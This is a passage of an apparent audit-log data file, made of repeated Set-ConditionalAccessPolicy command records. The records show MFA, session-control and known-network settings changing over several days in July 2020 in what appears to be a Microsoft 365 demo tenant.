''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/6/2020 1:42:07 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/6/2020 1:42:07 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/6/2020 4:29:48 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/6/2020 4:29:48 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/7/2020 1:51:17 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\5fd0c4ff-1cd7-4bf6-8607-294a04f58f12', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"142512c7-f006-46ae-909c-14fa7bf6a887\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/7/2020 1:51:18 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Azure MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/8/2020 2:30:51 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8837fdaa-aaeb-4432-9622-43f6f583d583', 'PolicyDetails': '{\\\"KnownNetworkPolicies\\\":{\\\"NetworkName\\\":\\\"BE-Office\\\",\\\"NetworkId\\\":\\\"b98b9088-ce88-4fae-80fb-5b58cb1ce685\\\",\\\"CidrIpRanges\\\":[\\\"109.88.218.99/28\\\"],\\\"CountryIsoCodes\\\":null,\\\"Categories\\\":[],\\\"ApplyToUnknownCountry\\\":false}}', 'PolicyLastUpdatedTime': '7/8/2020 2:30:51 AM', 'TenantDefaultPolicy': '6', 'DisplayName': 'Known Networks List', 'PolicyIdentifierString': '3/19/2020 7:45:08 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/8/2020 4:57:43 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/8/2020 4:57:42 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/9/2020 2:37:12 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/9/2020 2:37:14 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/10/2020 2:47:08 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\4c5a5ea0-5d9f-4730-baaa-7a69cf29ef26', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/10/2020 2:47:08 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Semolen - Admin MFA', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': '{\\\"Version\\\":0,\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:31:41.7083504Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/10/2020 5:29:23 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Block Access JulianI', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\2e76d011-eaa3-40b4-8ce8-7fba52bf3af8', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"f9e8b3d0-ba26-42cd-b544-c90a66191a81\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/10/2020 5:29:22 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'On-Prem SharePoint - MeganB proxy', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/11/2020 2:21:22 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\3b13ea3c-c733-4eb8-bd19-67d308b2ea04', 'PolicyDetails': '{\\\"Version\\\":0,\\\"CreatedDateTime\\\":\\\"2020-05-19T13:34:15.2394934Z\\\",\\\"ModifiedDateTime\\\":\\\"2020-05-19T13:39:04.7333386Z\\\",\\\"State\\\":\\\"Reporting\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"None\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"Guests\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"Android\\\",\\\"iOS\\\",\\\"macOS\\\"]}]},\\\"ClientTypes\\\":{\\\"Include\\\":[{\\\"ClientTypes\\\":[\\\"Browser\\\",\\\"Native\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\",\\\"RequireCompliantDevice\\\"]}]}', 'PolicyLastUpdatedTime': '7/11/2020 2:21:26 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Yanivsh -CA Test', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/11/2020 5:03:43 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/11/2020 5:03:44 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\69c7a12f-b407-45a3-b07e-fa04fc7f273d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000003-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"All\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/11/2020 5:03:43 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Test Policy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\bcd93f74-64fd-4042-a3ae-ee6d48886d6d', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"c9a559d2-7aab-4f13-a6ed-e7e9c52aec87\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"bdb72692-2275-412b-8af0-ea21c2ebd174\\\",\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":3}', 'PolicyLastUpdatedTime': '7/11/2020 5:03:41 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Form MCAS', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/12/2020 2:47:24 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\83a057fb-dbca-4ba8-bb5f-0ce6d6e7cff5', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Acrs\\\":[\\\"urn:microsoft:req1\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/12/2020 2:47:24 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Step-up', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/12/2020 5:31:05 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\6490d00c-7ba1-42cf-aa88-99eb71d53bf7', 'PolicyDetails': '{\\\"Version\\\":0,\\\"LastUpdatedTimestamp\\\":\\\"2020-07-02T12:42:35.1866847Z\\\",\\\"State\\\":\\\"Disabled\\\",\\\"SignInFrequency\\\":\\\"NotSet\\\",\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\"}', 'PolicyLastUpdatedTime': '7/12/2020 5:31:05 AM', 'TenantDefaultPolicy': '18', 'DisplayName': 'Default Policy', 'PolicyIdentifierString': '5/19/2020 1:39:05 PM'})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\8872f6fb-da88-4b63-bcc7-17247669596b', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\",\\\"09abbdfd-ed23-44ee-a2d9-a627aa1c90f3\\\",\\\"cc15fd57-2c6c-4117-a88c-83b1d56b4bbe\\\",\\\"00000003-0000-0ff1-ce00-000000000000\\\",\\\"00000005-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]}},\\\"SessionControls\\\":[\\\"CloudAppSecurity\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false,\\\"CasSessionControlType\\\":1}', 'PolicyLastUpdatedTime': '7/13/2020 2:48:08 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'MeganB MCAS Proxy', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\235bec94-f744-48ac-8314-5675953d2def', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Disabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"All\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"eababd92-9dc7-40e3-9359-6c106522db19\\\"]}]},\\\"DevicePlatforms\\\":{\\\"Include\\\":[{\\\"DevicePlatforms\\\":[\\\"All\\\"]}],\\\"Exclude\\\":[{\\\"DevicePlatforms\\\":[\\\"macOS\\\"]}]}},\\\"Controls\\\":[{\\\"Control\\\":[\\\"Mfa\\\"]}],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/13/2020 2:48:09 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'Megan MFA demo', 'PolicyIdentifierString': ''})\"],[\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\e183bd29-a3a3-4f91-a5a3-b83b21a544df', 'PolicyDetails': '{\\\"Version\\\":0,\\\"State\\\":\\\"Enabled\\\",\\\"Conditions\\\":{\\\"Applications\\\":{\\\"Include\\\":[{\\\"Applications\\\":[\\\"00000002-0000-0ff1-ce00-000000000000\\\"]}]},\\\"Users\\\":{\\\"Include\\\":[{\\\"Users\\\":[\\\"2935e535-8fdf-4217-865b-e084cb7214f1\\\"]}]}},\\\"SessionControls\\\":[\\\"AppEnforcedRestrictions\\\"],\\\"PersistentBrowserSessionMode\\\":\\\"NotSet\\\",\\\"EnforceAllPoliciesForEas\\\":false,\\\"IncludeOtherLegacyClientTypeForEvaluation\\\":false}', 'PolicyLastUpdatedTime': '7/13/2020 5:38:31 AM', 'TenantDefaultPolicy': '', 'DisplayName': 'JulianI Exchange native controls', 'PolicyIdentifierString': ''})\",\"Cmd(name='Set-ConditionalAccessPolicy', params={'Identity': 'seccxpninja.onmicrosoft.com\\\\\\\\ba36f0a4-6d73-4ba4-9282-3b3c14575e36', 'PolicyDetails': 